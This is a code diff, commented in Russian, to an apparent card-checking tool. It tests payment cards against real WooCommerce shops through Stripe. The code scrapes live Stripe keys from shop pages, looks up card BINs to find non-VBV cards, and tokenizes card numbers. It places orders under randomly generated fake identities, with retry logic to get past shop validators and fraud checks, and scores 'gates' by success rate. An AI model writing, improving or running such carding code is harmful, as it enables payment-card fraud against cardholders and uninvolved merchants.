@@ -221,6 +221,11 @@ def parse_card(raw: str) -> dict:
     else:
         parts = clean.split()
 
+    # "4111 1111 1111 1111 09 25 123" — 4-блочный PAN + MM YY CVV:
+    # раньше number=parts[0]="4111", mm="1111" — мусор на ровном месте
+    if len(parts) >= 7 and all(len(p) == 4 and p.isdigit() for p in parts[:4]):
+        parts = ["".join(parts[:4])] + parts[4:]
+
     if len(parts) < 3:
         digits_chunks = re.findall(r"\d+", clean)
         parts = digits_chunks if len(digits_chunks) >= 3 else parts
@@ -537,7 +542,8 @@ def wc_attribution_fields(donor_url: str) -> dict:
 
 # --- Sprint 3 core (Фаза 2): PaymentIntent retrieve/confirm + 3DS2 ---
 
-MAX_PI_AMOUNT_CENTS = 10000  # выше — CHARGE_RISK: не подтверждаем
+# единственный источник — config.py (дубль убран: рассинхрон при смене порога)
+MAX_PI_AMOUNT_CENTS = _cfg.MAX_PI_AMOUNT_CENTS
 
 
 async def stripe_retrieve_pi(session, pk: str, secret: str) -> dict | None:
@@ -833,7 +839,7 @@ def is_nonce_rejection(conf_resp: dict) -> bool:
 
 def score_gate(gate_dict: dict) -> float:
     """weight = success_rate / latency × штрафы за капчу, фейлы, STALE."""
-    sr = float(gate_dict.get("success_rate", 0.5))
+    sr = float(gate_dict.get("success_rate") or 0.5)
     lat = max(int(gate_dict.get("latency_avg_ms") or 1000), 100)
     w = sr / lat
     if gate_dict.get("captcha_on_add_card"):
@@ -878,6 +884,22 @@ def bin_alpha2(binfo: dict) -> str:
     return ""
 
 
+def _normalize_handyapi_bin(d: dict) -> dict:
+    """handyapi отдаёт PascalCase (Scheme/Type/Issuer/Country.A2) — приводим
+    к каноническому binlist-совместимому lowercase-виду."""
+    c = d.get("Country") if isinstance(d.get("Country"), dict) else {}
+    return {"scheme": d.get("Scheme"), "type": d.get("Type"),
+            "bank": {"name": d.get("Issuer")},
+            "country": {"alpha2": c.get("A2"), "name": c.get("Name")},
+            "level": d.get("CardTier")}
+
+
+def _bin_response_usable(d: dict) -> bool:
+    """200 с ошибочным/пустым телом — не источник: хотя бы одно поле живо."""
+    return bool(d.get("scheme") or (d.get("bank") or {}).get("name")
+                or (d.get("country") or {}).get("alpha2"))
+
+
 async def bin_lookup_enriched(bin6: str) -> dict:
     """6.3: все три источника, мерж; is_vbv для non-VBV детекта.
     antipublic первым (отдаёт level/vbv), binlist+handyapi добивают поля."""
@@ -900,7 +922,7 @@ async def bin_lookup_enriched(bin6: str) -> dict:
             merged["_src"].append(url.split("/")[2])
             if "antipublic" in url:
                 c_name = str(d.get("country_name", "")).lower()
-                a2 = _ANTIPUBLIC_A2.get(c_name, "")
+                a2 = str(d.get("country") or "").upper() or _ANTIPUBLIC_A2.get(c_name, "")
                 merged.update({"scheme": d.get("brand"), "type": d.get("type"),
                                "level": d.get("level"),
                                "bank": {"name": d.get("bank")},
@@ -915,9 +937,17 @@ async def bin_lookup_enriched(bin6: str) -> dict:
                     merged["country"]["alpha2"] = d["country"].get("alpha2")
                 if d.get("bank") and not merged["bank"].get("name"):
                     merged["bank"] = d.get("bank")
-            else:  # handyapi
-                merged["scheme"] = merged.get("scheme") or d.get("scheme")
-                merged["type"] = merged.get("type") or d.get("type")
+            else:  # handyapi (PascalCase -> нормализация)
+                h = _normalize_handyapi_bin(d)
+                if _bin_response_usable(h):
+                    merged["scheme"] = merged.get("scheme") or h.get("scheme")
+                    merged["type"] = merged.get("type") or h.get("type")
+                    if h["bank"].get("name") and not merged["bank"].get("name"):
+                        merged["bank"] = h["bank"]
+                    if h["country"].get("alpha2") and not merged["country"].get("alpha2"):
+                        merged["country"] = h["country"]
+                    if h.get("level") and not merged.get("level"):
+                        merged["level"] = h["level"]
     # эвристика: premium/бизнес уровни чаще enrolled — но без данных источника
     # честно оставляем None (unknown)
     return merged
@@ -1106,6 +1136,28 @@ def _braintree_verdict(pm: dict) -> tuple[str, str] | dict:
     return {"status": "INVALID", "detail": f"{card_type} ****{last4} rejected"}
 
 
+_PM_WALLET_RX = re.compile(
+    r"applepay|googlepay|ideal|bancontact|sepa|klarna|afterpay|affirm|alipay|"
+    r"wechat|eps|p24|multibanco|boleto|oxxo|blik|fpx|becs|ach|grabpay|paypal|ppcp",
+    re.I)
+
+
+def _pick_pm_slug(methods: list) -> str:
+    """Слаг платёжки для checkout из cart.payment_methods.
+    «stripe» не у всех: magnesiumshop/wisdomofplanets держат только stripe_cc.
+    Порядок: stripe_cc → stripe → любой stripe_* без wallet-слов."""
+    if not methods:
+        return "stripe"
+    if "stripe_cc" in methods:
+        return "stripe_cc"
+    if "stripe" in methods:
+        return "stripe"
+    for m in methods:
+        if m.startswith("stripe") and not _PM_WALLET_RX.search(m):
+            return m
+    return "stripe"
+
+
 async def store_api_confirm(s, root: str, pk: str, card_raw: str,
                             country: str = "US",
                             max_price_cents: int = 200) -> dict:
@@ -1115,12 +1167,16 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
     max_price_cents. Возвращает {status, detail, amount_cents, currency}."""
     import json as _json
     root = root.rstrip("/")
+    store_lang = ""  # lang витрины -> фоллбэк страны, когда draft молчит
     if not pk or not pk.startswith("pk_live"):
         # ключ не передан/обрезан — ищем на витрине и чекаут-путях
         for path in ("/", "/checkout/", "/checkout", "/shop/"):
             try:
                 r0 = await s.get(root + path, timeout=12)
                 pk = extract_pk_live(r0.text) or ""
+                if not store_lang:
+                    m_lang = re.search(r'<html[^>]*lang="([a-z]{2})-', r0.text, re.I)
+                    store_lang = (m_lang.group(1).upper() if m_lang else "")
             except Exception:
                 continue
             if pk:
@@ -1135,6 +1191,14 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
 
     try:
         r_cart = await s.get(f"{api}/cart", timeout=10)
+        # доступные платёжные slugs магазина: слать ВЕРНЫЙ payment_method
+        # с первого POST — иначе Woo схлопывает корзину после invalid-попытки
+        # (magnesiumshop/wisdomofplanets: есть только stripe_cc, «stripe» нет)
+        cart_payment_methods = []
+        try:
+            cart_payment_methods = (r_cart.json().get("payment_methods") or [])
+        except Exception:
+            cart_payment_methods = []
 
         def _take_nonce(resp) -> None:
             """Store API nonce одноразовый на мутацию — каждый ответ несёт свежий."""
@@ -1151,6 +1215,7 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
 
         r_prod = await s.get(f"{api}/products", params={"per_page": 30},
                              headers={"Nonce": nonce}, timeout=10)
+        _take_nonce(r_prod)  # Woo ротирует nonce в каждом ответе — подхватываем
         items = r_prod.json()
         if not isinstance(items, list) or not items:
             return {"status": "ERROR", "detail": "Store API: no products visible",
@@ -1225,6 +1290,28 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
         except Exception:
             pass
 
+        country = telem.get("country") or country
+        # Гео-выравнивание по магазину: не-US витрины часто продают только по своей
+        # стране — US-биллинг даёт invalid_address_country. Дефолтная страна
+        # берётся из GET /checkout (draft). Падение — остаёмся на стране BIN.
+        try:
+            r_draft = await s.get(f"{api}/checkout",
+                                   headers={"Nonce": nonlocal_nonce[0]}, timeout=10)
+            _take_nonce(r_draft)
+            draft = r_draft.json()
+            shop_country = ((draft.get("billing_address") or {}).get("country") or "").upper()
+            if not shop_country and store_lang in GEO_POOLS:
+                # draft молчит о стране — берём lang витрины (magnesiumshop:
+                # nl-NL витрина, US-биллинг браковался как Ongeldige parameter)
+                shop_country = store_lang
+            if len(shop_country) == 2 and shop_country != country:
+                country = shop_country
+                telem.update(geo_identity_fields(country))
+        except Exception:
+            pass
+
+        # Токенизация ПОСЛЕ гео-выравнивания: биллинг PaymentMethod обязан
+        # совпадать со страной checkout, иначе fraud-отказы на ровном месте
         card = parse_card(card_raw)
         tok_body = tokenize_body(card, telem, root)
         r_tok = await s.post("https://api.stripe.com/v1/payment_methods",
@@ -1236,64 +1323,48 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
                     "detail": err.get("message", str(tok_data))[:200],
                     "amount_cents": price_c, "currency": curr}
         pm_id = tok_data["id"]
-
-        country = telem.get("country") or country
-        # Гео-выравнивание по магазину: не-US витрины часто продают только по своей
-        # стране — US-биллинг даёт invalid_address_country. Дефолтная страна
-        # берётся из GET /checkout (draft). Падение — остаёмся на стране BIN.
-        try:
-            r_draft = await s.get(f"{api}/checkout",
-                                   headers={"Nonce": nonlocal_nonce[0]}, timeout=10)
-            _take_nonce(r_draft)
-            draft = r_draft.json()
-            shop_country = ((draft.get("billing_address") or {}).get("country") or "").upper()
-            if len(shop_country) == 2 and shop_country != country:
-                country = shop_country
-                telem.update(geo_identity_fields(country))
-        except Exception:
-            pass
         # полная личность для биллинга (email и т.п.) + гео-выравнивание адреса
         geo = geo_identity_fields(country)
         telem.update(geo)
         ident = {**random_identity(country), **geo}
         checkout_body = {
             "billing_address": {
-                # или-цепочки: telem может нести ПУСТЫЕ строки вместо отсутствия ключа
-                "first_name": telem.get("first_name") or ident.get("first_name", "James"),
-                "last_name": telem.get("last_name") or ident.get("last_name", "Carter"),
+                # ident = random_identity + гео страны магазина — все ключи гарантированы
+                "first_name": ident["first_name"],
+                "last_name": ident["last_name"],
                 "company": "",
-                "address_1": telem.get("address_1") or ident.get("line1", ""),
+                "address_1": ident["line1"],
                 "address_2": "",
-                "city": telem.get("city") or ident.get("city", ""),
-                "state": ident.get("state", ""),
-                "postcode": ident.get("postal_code", ""),
+                "city": ident["city"],
+                "state": ident["state"],
+                "postcode": ident["postal_code"],
                 "country": country,
-                "email": telem.get("email") or ident.get("email", ""),
+                "email": ident["email"],
                 # Woo Blocks-checkout у части магазинов требует phone — генерим всегда
                 # (555-01xx — зарезервированный диапазон, реальных абонентов нет)
-                "phone": (telem.get("phone") or ident.get("phone")
-                          or f"+{random.randint(1, 9)} 555 {random.randint(100, 999)} "
-                             f"{random.randint(1000, 9999)}"),
+                "phone": f"+{random.randint(1, 9)} 555 {random.randint(100, 999)} "
+                         f"{random.randint(1000, 9999)}",
             },
-                        # physical-goods carts require a valid same-country shipping address;
+            # physical-goods carts require a valid same-country shipping address;
             # часть магазинов требует phone и в shipping (IT/FR-валидаторы)
             "shipping_address": {
-                "first_name": telem.get("first_name") or ident.get("first_name", "James"),
-                "last_name": telem.get("last_name") or ident.get("last_name", "Carter"),
+                "first_name": ident["first_name"],
+                "last_name": ident["last_name"],
                 "company": "",
-                "address_1": telem.get("address_1") or ident.get("line1", ""),
+                "address_1": ident["line1"],
                 "address_2": "",
-                "city": telem.get("city") or ident.get("city", ""),
-                "state": ident.get("state", ""),
-                "postcode": telem.get("postal_code", ""),
+                "city": ident["city"],
+                "state": ident["state"],
+                "postcode": ident["postal_code"],
                 "country": country,
-                "phone": (telem.get("phone") or ident.get("phone")
-                          or f"+{random.randint(1, 9)} 555 {random.randint(100, 999)} "
-                             f"{random.randint(1000, 9999)}"),
+                "phone": f"+{random.randint(1, 9)} 555 {random.randint(100, 999)} "
+                         f"{random.randint(1000, 9999)}",
             },
             "customer_note": "", "create_account": False,
             "terms": True,  # магазины с включённым terms-чекбоксом иначе дают terms_error
-            "payment_method": "stripe",
+            # верный slug с первого раза: cart.payment_methods знает список;
+            # предпочитаем чистые card-методы (stripe_cc/stripe), wallet/local — мимо
+            "payment_method": _pick_pm_slug(cart_payment_methods),
             "payment_data": [
                 {"key": "wc-stripe-payment-method", "value": pm_id},
                 {"key": "wc-stripe-payment-type", "value": "card"},
@@ -1305,6 +1376,9 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
         geo_fixed = False
         addr2_fixed = False
         checkout_retried = False
+        account_retried = False   # terms/guest-checkout → create_account
+        shipless_retried = False  # NL-валидатор бракует адресные параметры
+        cart_retried = False      # cart_empty → пересборка корзины
         for attempt in range(10):
             r_co = await s.post(f"{api}/checkout", json=checkout_body,
                                 headers={"Nonce": nonlocal_nonce[0]}, timeout=20)
@@ -1386,10 +1460,22 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
                         addr["address_1"] = new_geo["line1"]
                         if iso_states:
                             addr["country"] = fixed_state.split("-")[0]
+                    # PM ретокенизируем: биллинг PaymentMethod обязан следовать
+                    # за новым адресом, иначе рассинхрон PM/checkout → fraud-отказ
+                    try:
+                        telem.update(new_geo)
+                        r_tok2 = await s.post(
+                            "https://api.stripe.com/v1/payment_methods",
+                            data=tokenize_body(card, telem, root),
+                            headers=TOKENIZE_HEADERS, timeout=10)
+                        td2 = r_tok2.json()
+                        if "id" in td2:
+                            pm_id = td2["id"]
+                            checkout_body["payment_data"][0] = {
+                                "key": "wc-stripe-payment-method", "value": pm_id}
+                    except Exception:
+                        pass
                     continue
-            # address_2 обязателен у части магазинов (ES «Apartamento... es
-            # obligatorio») — заполняем и перепосылаем; код ошибки может быть
-            # как rest_invalid_param, так и woocommerce_rest_invalid_address
             addr_req_err = addr_err or msg_raw
             if (code in ("rest_invalid_param", "woocommerce_rest_invalid_address")
                     and not addr2_fixed and addr_req_err
@@ -1399,24 +1485,58 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
                     addr["address_2"] = f"Apartment {random.randint(1, 40)}"
                 addr2_fixed = True
                 continue
-            break
-        secrets = RE_CLIENT_SECRET.findall(txt)
-        pr = d.get("payment_result") or {}
-        # Blocks-checkout отдаёт payment_result.payment_status (не status) и
-        # свежий client_secret в base64-редиректе — это PI_MINTED, не failure
-        import base64 as _b64
-        redir = ""
-        for det in (pr.get("payment_details") or []):
-            if isinstance(det, dict) and det.get("key") == "redirect":
-                redir = str(det.get("value") or "")
-        if redir and not secrets:
-            m = re.search(r"#response=([A-Za-z0-9+/=_-]+)", redir)
-            if m:
+            # magnesiumshop-кейс: NL-валидатор бракует адресные параметры —
+            # повторяем без shipping_address (virtual-корзине он не нужен)
+            if (code == "rest_invalid_param" and not shipless_retried
+                    and re.search(r"shipping_address", addr_err, re.I)):
+                shipless_retried = True
+                checkout_body.pop("shipping_address", None)
+                continue
+            # coachconnect-кейс: «You must accept the terms and conditions to
+            # create an account» — магазин требует регистрацию при заказе;
+            # brick-library-кейс: guest_checkout_disabled → logged in to checkout
+            if (not account_retried and (
+                    "terms and conditions" in msg_raw.lower()
+                    or code == "woocommerce_rest_guest_checkout_disabled"
+                    or "logged in to checkout" in msg_raw.lower())):
+                account_retried = True
+                checkout_body["create_account"] = True
+                continue
+            # wisdomofplanets-кейс: 409 cart_empty при живом add-item — корзина
+            # потерялась между запросами; пересобираем и повторяем checkout
+            if code == "woocommerce_rest_cart_empty" and not cart_retried:
+                cart_retried = True
                 try:
-                    dec = _b64.urlsafe_b64decode(m.group(1) + "==").decode("utf-8", "ignore")
-                    secrets = RE_CLIENT_SECRET.findall(dec)
+                    r_add2 = await s.post(f"{api}/cart/add-item",
+                                          params={"id": prod["id"], "quantity": "1"},
+                                          headers={"Nonce": nonlocal_nonce[0]}, timeout=10)
+                    _take_nonce(r_add2)
                 except Exception:
                     pass
+                continue
+            break
+
+        def _secrets_from(txt: str, body_dict: dict) -> list:
+            """Секреты из ответа checkout: прямые + base64-редирект (#response=).
+            Единая точка — используется и первым проходом, и cherry-retry."""
+            secs = RE_CLIENT_SECRET.findall(txt)
+            if not secs:
+                pr0 = body_dict.get("payment_result") or {}
+                redir0 = ""
+                for det in (pr0.get("payment_details") or []):
+                    if isinstance(det, dict) and det.get("key") == "redirect":
+                        redir0 = str(det.get("value") or "")
+                m0 = re.search(r"#response=([A-Za-z0-9+/=_-]+)", redir0)
+                if m0:
+                    try:
+                        dec = _b64.urlsafe_b64decode(m0.group(1) + "==").decode("utf-8", "ignore")
+                        secs = RE_CLIENT_SECRET.findall(dec)
+                    except Exception:
+                        pass
+            return secs
+
+        secrets = _secrets_from(txt, d)
+        pr = d.get("payment_result") or {}
         p_status = pr.get("status") or pr.get("payment_status") or ""
         details_txt = _json.dumps(pr.get("payment_details", []), ensure_ascii=False)
 
@@ -1434,7 +1554,7 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
                 d = _json.loads(txt)
             except Exception:
                 d = {}
-            secrets = RE_CLIENT_SECRET.findall(txt)
+            secrets = _secrets_from(txt, d)
             pr = d.get("payment_result") or {}
             p_status = pr.get("status") or pr.get("payment_status") or ""
             details_txt = _json.dumps(pr.get("payment_details", []), ensure_ascii=False)
@@ -1457,8 +1577,11 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
                 return {"status": "PI_PENDING",
                         "detail": (f"order {d.get('order_id', '')} placed, PI={pi_st} — "
                                    f"payment NOT confirmed"), **base}
-            return {"status": "APPROVED@PAID",
-                    "detail": f"order paid {d.get('order_id', '')}", **base}
+            # секрета нет → доказательства оплаты нет (herbaura-паттерн):
+            # заказ размещён, PI не проверен — APPROVED@PAID не выдаём
+            return {"status": "PI_PENDING",
+                    "detail": f"order {d.get('order_id', '')} placed, PI secret "
+                              f"not found — payment NOT confirmed", **base}
         if p_status == "failure":
             verdict = classify_verdict(details_txt + " " + str(d.get("message", "")))
             return {"status": verdict,
